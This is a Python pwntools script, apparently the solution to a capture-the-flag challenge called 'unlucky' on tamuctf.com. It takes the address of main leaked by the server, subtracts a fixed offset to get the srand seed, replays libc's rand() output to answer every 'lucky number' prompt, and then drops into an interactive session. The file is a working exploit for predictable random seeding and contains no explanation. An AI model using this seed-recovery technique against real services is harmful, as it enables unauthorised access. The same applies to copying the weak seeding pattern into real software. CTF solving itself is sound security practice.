from pwn import *
from ctypes import CDLL

libc = CDLL("libc.so.6")

offset = 0x5554ffffd13d # address of main - address of seed

io = remote("tamuctf.com", 443, ssl=True, sni="unlucky")

io.recvuntil("Here's a lucky number: ")
main_addr = int(io.recvline().strip(), 16)
seed = main_addr - offset
libc.srand(seed)

while (out := io.clean(0.5)) and b"lucky number" in out:
    io.sendline(f"{libc.rand()}")

success(out.decode())
io.interactive()
